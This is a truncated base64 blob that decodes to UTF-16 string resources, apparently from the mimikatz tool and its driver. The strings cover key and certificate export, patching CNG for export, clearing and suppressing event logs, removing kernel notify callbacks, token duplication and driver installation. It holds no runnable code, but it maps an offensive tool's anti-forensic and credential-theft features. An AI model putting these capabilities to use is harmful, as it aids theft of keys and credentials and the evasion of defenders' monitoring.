IABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8ARQBOAEgAXwBSAFMAQQBfAEEARQBTAF8AUABSAE8AVgAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAFIAUwBBACAAYQBuAGQAIABBAEUAUwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAAoAFAAcgBvAHQAbwB0AHkAcABlACkAAABNAFMAXwBFAE4ASABfAFIAUwBBAF8AQQBFAFMAXwBQAFIATwBWAF8AWABQAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAUwBtAGEAcgB0ACAAQwBhAHIAZAAgAEMAcgB5AHAAdABvACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8AUwBDAEEAUgBEAF8AUABSAE8AVgAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARABIACAAUwBDAGgAYQBuAG4AZQBsACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAATQBTAF8ARABFAEYAXwBEAEgAXwBTAEMASABBAE4ATgBFAEwAXwBQAFIATwBWAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAARABTAFMAIABhAG4AZAAgAEQAaQBmAGYAaQBlAC0ASABlAGwAbABtAGEAbgAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAE0AUwBfAEUATgBIAF8ARABTAFMAXwBEAEgAXwBQAFIATwBWAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABhAG4AZAAgAEQAaQBmAGYAaQBlAC0ASABlAGwAbABtAGEAbgAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAE0AUwBfAEQARQBGAF8ARABTAFMAXwBEAEgAXwBQAFIATwBWAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8ARABFAEYAXwBEAFMAUwBfAFAAUgBPAFYAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMAQQAgAFMAQwBoAGEAbgBuAGUAbAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAABNAFMAXwBEAEUARgBfAFIAUwBBAF8AUwBDAEgAQQBOAE4ARQBMAF8AUABSAE8AVgAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMAQQAgAFMAaQBnAG4AYQB0AHUAcgBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAATQBTAF8ARABFAEYAXwBSAFMAQQBfAFMASQBHAF8AUABSAE8AVgAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwB0AHIAbwBuAGcAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8AUwBUAFIATwBOAEcAXwBQAFIATwBWAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAB2ADEALgAwAAAAAABNAFMAXwBFAE4ASABBAE4AQwBFAEQAXwBQAFIATwBWAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAgAHYAMQAuADAAAAAAAE0AUwBfAEQARQBGAF8AUABSAE8AVgAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAFMARQBSAFYASQBDAEUAUwAAAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AVQBTAEUAUgBTAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFMARQBSAFYASQBDAEUAAAAAAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBfAEUATgBUAEUAUgBQAFIASQBTAEUAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXwBHAFIATwBVAFAAXwBQAE8ATABJAEMAWQAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBfAEcAUgBPAFUAUABfAFAATwBMAEkAQwBZAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFUAUwBFAFIAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAFAAYQB0AGMAaAAgAEMATgBHACAAcwBlAHIAdgBpAGMAZQAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAABjAG4AZwAAAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABQAGEAdABjAGgAIABDAHIAeQBwAHQAbwBBAFAASQAgAGwAYQB5AGUAcgAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAABjAGEAcABpAAAAAABMAGkAcwB0ACAAKABvAHIAIABlAHgAcABvAHIAdAApACAAawBlAHkAcwAgAGMAbwBuAHQAYQBpAG4AZQByAHMAAAAAAGsAZQB5AHMAAAAAAEwAaQBzAHQAIAAoAG8AcgAgAGUAeABwAG8AcgB0ACkAIABjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAAAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzAAAAAABMAGkAcwB0ACAAYwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAHMAdABvAHIAZQBzAAAAcwB0AG8AcgBlAHMAAAAAAEwAaQBzAHQAIABjAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAcAByAG8AdgBpAGQAZQByAHMAAAAAAHAAcgBvAHYAaQBkAGUAcgBzAAAAQwByAHkAcAB0AG8AIABNAG8AZAB1AGwAZQAAAGMAcgB5AHAAdABvAAAAAAByAHMAYQBlAG4AaAAAAAAAQ1BFeHBvcnRLZXkAbgBjAHIAeQBwAHQAAAAAAE5DcnlwdE9wZW5TdG9yYWdlUHJvdmlkZXIAAABOQ3J5cHRFbnVtS2V5cwAATkNyeXB0T3BlbktleQAAAE5DcnlwdEV4cG9ydEtleQBOQ3J5cHRHZXRQcm9wZXJ0eQAAAE5DcnlwdEZyZWVCdWZmZXIAAAAATkNyeXB0RnJlZU9iamVjdAAAAABCQ3J5cHRFbnVtUmVnaXN0ZXJlZFByb3ZpZGVycwAAAEJDcnlwdEZyZWVCdWZmZXIAAAAACgBDAHIAeQBwAHQAbwBBAFAASQAgAHAAcgBvAHYAaQBkAGUAcgBzACAAOgAKAAAAJQAyAHUALgAgACUAcwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABDAHIAeQBwAHQARQBuAHUAbQBQAHIAbwB2AGkAZABlAHIAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAKAEMATgBHACAAcAByAG8AdgBpAGQAZQByAHMAIAA6AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABCAEMAcgB5AHAAdABFAG4AdQBtAFIAZQBnAGkAcwB0AGUAcgBlAGQAUAByAG8AdgBpAGQAZQByAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAHMAeQBzAHQAZQBtAHMAdABvAHIAZQAAAAAAAABBAHMAawBpAG4AZwAgAGYAbwByACAAUwB5AHMAdABlAG0AIABTAHQAbwByAGUAIAAnACUAcwAnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AcwB0AG8AcgBlAHMAIAA7ACAAQwBlAHIAdABFAG4AdQBtAFMAeQBzAHQAZQBtAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABNAHkAAAAAAHMAdABvAHIAZQAAACAAKgAgAFMAeQBzAHQAZQBtACAAUwB0AG8AcgBlACAAIAA6ACAAJwAlAHMAJwAgACgAMAB4ACUAMAA4AHgAKQAKACAAKgAgAFMAdABvAHIAZQAgACAAIAAgACAAIAAgACAAIAA6ACAAJwAlAHMAJwAKAAoAAAAAACgAbgB1AGwAbAApAAAAAAAJAEsAZQB5ACAAQwBvAG4AdABhAGkAbgBlAHIAIAAgADoAIAAlAHMACgAJAFAAcgBvAHYAaQBkAGUAcgAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAAAACQBUAHkAcABlACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFUAcwBlAHIASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABrAGUAeQBTAHAAZQBjACAAPQA9ACAAQwBFAFIAVABfAE4AQwBSAFkAUABUAF8ASwBFAFkAXwBTAFAARQBDACAAdwBpAHQAaABvAHUAdAAgAEMATgBHACAASABhAG4AZABsAGUAIAA/AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwByAHkAcAB0AEEAYwBxAHUAaQByAGUAQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAcgBpAHYAYQB0AGUASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAQwBvAG4AdABlAHgAdABQAHIAbwBwAGUAcgB0AHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABOAGEAbQBlAFMAdAByAGkAbgBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZQByAHQARwBlAHQATgBhAG0AZQBTAHQAcgBpAG4AZwAgACgAZgBvAHIAIABsAGUAbgApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABPAHAAZQBuAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABwAHIAbwB2AGkAZABlAHIAAAAAAHAAcgBvAHYAaQBkAGUAcgB0AHkAcABlAAAAAABtAGEAYwBoAGkAbgBlAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwBvAGYAdAB3AGEAcgBlACAASwBlAHkAIABTAHQAbwByAGEAZwBlACAAUAByAG8AdgBpAGQAZQByAAAAYwBuAGcAcAByAG8AdgBpAGQAZQByAAAAIAAqACAAUwB0AG8AcgBlACAAIAAgACAAIAAgACAAIAAgADoAIAAnACUAcwAnAAoAIAAqACAAUAByAG8AdgBpAGQAZQByACAAIAAgACAAIAAgADoAIAAnACUAcwAnACAAKAAnACUAcwAnACkACgAgACoAIABQAHIAbwB2AGkAZABlAHIAIAB0AHkAcABlACAAOgAgACcAJQBzACcAIAAoACUAdQApAAoAIAAqACAAQwBOAEcAIABQAHIAbwB2AGkAZABlAHIAIAAgADoAIAAnACUAcwAnAAoAAAAAAAoAQwByAHkAcAB0AG8AQQBQAEkAIABrAGUAeQBzACAAOgAKAAAAAAAKACUAMgB1AC4AIAAlAHMACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABDAHIAeQBwAHQARwBlAHQAVQBzAGUAcgBLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFAAcgBvAHYAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAoAQwBOAEcAIABrAGUAeQBzACAAOgAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAATgBDAHIAeQBwAHQATwBwAGUAbgBLAGUAeQAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABOAEMAcgB5AHAAdABFAG4AdQBtAEsAZQB5AHMAIAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAE4AQwByAHkAcAB0AE8AcABlAG4AUwB0AG8AcgBhAGcAZQBQAHIAbwB2AGkAZABlAHIAIAAlADAAOAB4AAoAAAAAAEUAeABwAG8AcgB0ACAAUABvAGwAaQBjAHkAAABMAGUAbgBnAHQAaAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAcgBpAG4AdABLAGUAeQBJAG4AZgBvAHMAIAA7ACAATgBDAHIAeQBwAHQARwBlAHQAUAByAG8AcABlAHIAdAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcAByAGkAbgB0AEsAZQB5AEkAbgBmAG8AcwAgADsAIABDAHIAeQBwAHQARwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFkARQBTAAAATgBPAAAAAAAJAEUAeABwAG8AcgB0AGEAYgBsAGUAIABrAGUAeQAgADoAIAAlAHMACgAJAEsAZQB5ACAAcwBpAHoAZQAgACAAIAAgACAAIAAgADoAIAAlAHUACgAAAAAAcAB2AGsAAABDAEEAUABJAFAAUgBJAFYAQQBUAEUAQgBMAE8AQgAAAE8ASwAAAAAASwBPAAAAAAAJAFAAcgBpAHYAYQB0AGUAIABlAHgAcABvAHIAdAAgADoAIAAlAHMAIAAtACAAAAAnACUAcwAnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAEUAeABwAG8AcgB0ACAALwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABLAGUAeQBUAG8ARgBpAGwAZQAgADsAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZwBlAG4AZQByAGEAdABlAEYAaQBsAGUATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABkAGUAcgAAAAkAUAB1AGIAbABpAGMAIABlAHgAcABvAHIAdAAgACAAOgAgACUAcwAgAC0AIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABDAGUAcgB0ACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAQwBlAHIAdAAgADsAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZwBlAG4AZQByAGEAdABlAEYAaQBsAGUATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAcABmAHgAAABtAGkAbQBpAGsAYQB0AHoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABDAGUAcgB0ACAAOwAgAEUAeABwAG8AcgB0ACAALwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAJQBzAF8AJQBzAF8AJQB1AF8AJQBzAC4AJQBzAAAAAABBAFQAXwBLAEUAWQBFAFgAQwBIAEEATgBHAEUAAAAAAEEAVABfAFMASQBHAE4AQQBUAFUAUgBFAAAAAABDAE4ARwAgAEsAZQB5AAAAcgBzAGEAZQBuAGgALgBkAGwAbAAAAAAATABvAGMAYQBsACAAQwByAHkAcAB0AG8AQQBQAEkAIABwAGEAdABjAGgAZQBkAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBwAF8AYwBhAHAAaQAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAXwBjAGEAcABpACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAG4AYwByAHkAcAB0AC4AZABsAGwAAAAAAG4AYwByAHkAcAB0AHAAcgBvAHYALgBkAGwAbAAAAAAASwBlAHkASQBzAG8AAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBwAF8AYwBuAGcAIAA7ACAATgBvACAAQwBOAEcACgAAAEMAbABlAGEAcgAgAGEAbgAgAGUAdgBlAG4AdAAgAGwAbwBnAAAAAABjAGwAZQBhAHIAAAAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAcABhAHQAYwBoACAARQB2AGUAbgB0AHMAIABzAGUAcgB2AGkAYwBlACAAdABvACAAYQB2AG8AaQBkACAAbgBlAHcAIABlAHYAZQBuAHQAcwAAAGQAcgBvAHAAAAAAAEUAdgBlAG4AdAAgAG0AbwBkAHUAbABlAAAAAABlAHYAZQBuAHQAAABsAG8AZwAAAGUAdgBlAG4AdABsAG8AZwAuAGQAbABsAAAAAAB3AGUAdgB0AHMAdgBjAC4AZABsAGwAAABFAHYAZQBuAHQATABvAGcAAAAAAFMAZQBjAHUAcgBpAHQAeQAAAAAAVQBzAGkAbgBnACAAIgAlAHMAIgAgAGUAdgBlAG4AdAAgAGwAbwBnACAAOgAKAAAALQAgACUAdQAgAGUAdgBlAG4AdAAoAHMAKQAKAAAAAAAtACAAQwBsAGUAYQByAGUAZAAgACEACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZQB2AGUAbgB0AF8AYwBsAGUAYQByACAAOwAgAEMAbABlAGEAcgBFAHYAZQBuAHQATABvAGcAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBlAHYAZQBuAHQAXwBjAGwAZQBhAHIAIAA7ACAATwBwAGUAbgBFAHYAZQBuAHQATABvAGcAIAAoADAAeAAlADAAOAB4ACkACgAAAEwAaQBzAHQAIABtAGkAbgBpAGYAaQBsAHQAZQByAHMAAAAAAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABGAFMAIABmAGkAbAB0AGUAcgBzAAAAZgBpAGwAdABlAHIAcwAAAFIAZQBtAG8AdgBlACAAbwBiAGoAZQBjAHQAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawAAAG4AbwB0AGkAZgBPAGIAagBlAGMAdABSAGUAbQBvAHYAZQAAAFIAZQBtAG8AdgBlACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAAAAAABuAG8AdABpAGYAUAByAG8AYwBlAHMAcwBSAGUAbQBvAHYAZQAAAAAATABpAHMAdAAgAG8AYgBqAGUAYwB0ACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAcwAAAAAAbgBvAHQAaQBmAE8AYgBqAGUAYwB0AAAATABpAHMAdAAgAHIAZQBnAGkAcwB0AHIAeQAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAAAAAG4AbwB0AGkAZgBSAGUAZwAAAAAATABpAHMAdAAgAGkAbQBhAGcAZQAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAABuAG8AdABpAGYASQBtAGEAZwBlAAAAAABMAGkAcwB0ACAAdABoAHIAZQBhAGQAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAABuAG8AdABpAGYAVABoAHIAZQBhAGQAAABMAGkAcwB0ACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAABuAG8AdABpAGYAUAByAG8AYwBlAHMAcwAAAAAATABpAHMAdAAgAFMAUwBEAFQAAABzAHMAZAB0AAAAAABMAGkAcwB0ACAAbQBvAGQAdQBsAGUAcwAAAAAAbQBvAGQAdQBsAGUAcwAAAFMAZQB0ACAAYQBsAGwAIABwAHIAaQB2AGkAbABlAGcAZQAgAG8AbgAgAHAAcgBvAGMAZQBzAHMAAAAAAHAAcgBvAGMAZQBzAHMAUAByAGkAdgBpAGwAZQBnAGUAAAAAAEQAdQBwAGwAaQBjAGEAdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwBrAGUAbgAAAHAAcgBvAGMAZQBzAHMAVABvAGsAZQBuAAAAAABQAHIAbwB0AGUAYwB0ACAAcAByAG8AYwBlAHMAcwAAAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAAAAAAQgBTAE8ARAAgACEAAAAAAGIAcwBvAGQAAAAAAFAAaQBuAGcAIAB0AGgAZQAgAGQAcgBpAHYAZQByAAAAcABpAG4AZwAAAAAAAAAAAFIAZQBtAG8AdgBlACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIAAoAG0AaQBtAGkAZAByAHYAKQAAAAAALQAAAEkAbgBzAHQAYQBsAGwAIABhAG4AZAAvAG8AcgAgAHMAdABhAHIAdAAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAACsAAAByAGUAbQBvAHYAZQAAAAAATABpAHMAdAAgAHAAcgBvAGMAZQBzAHMAAAAAAHAAcgBvAGMAZQBzAHMAAABtAGkAbQBpAGQAcgB2AC4AcwB5AHMAAABtAGkAbQBpAGQAcgB2AAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAGEAbAByAGUAYQBkAHkAIAByAGUAZwBpAHMAdABlAHIAZQBkAAoAAABbACoAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAbgBvAHQAIABwAHIAZQBzAGUAbgB0AAoAAAAAAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAByAGUAZwBpAHMAdABlAHIAZQBkAAoAAAAAAAAAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAQQBDAEwAIAB0AG8AIABlAHYAZQByAHkAbwBuAGUACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAFcAbwByAGwAZABUAG8ATQBpAG0AaQBrAGEAdAB6ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAEMAcgBlAGEAdABlAFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGkAcwBGAGkAbABlAEUAeABpAHMAdAAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwBnAGUAdABBAGIAcwBvAGwAdQB0AGUAUABhAHQAaABPAGYAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAE8AcABlAG4AUwBlAHIAdgBpAGMAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAHMAdABhAHIAdABlAGQACgAAAAAAAAAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABhAGwAcgBlAGEAZAB5ACAAcwB0AGEAcgB0AGUAZAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABTAHQAYQByAHQAUwBlAHIAdgBpAGMAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAQwBNAGEAbgBhAGcAZQByACgAYwByAGUAYQB0AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAHMAdABvAHAAcABlAGQACgAAAAAAWwAqAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAG4AbwB0ACAAcgB1AG4AbgBpAG4AZwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHIAZQBtAG8AdgBlAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAHMAZQByAHYAaQBjAGUAXwBzAHQAbwBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIAByAGUAbQBvAHYAZQBkAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcgBlAG0AbwB2AGUAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAHIAZQBtAG8AdgBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFAAcg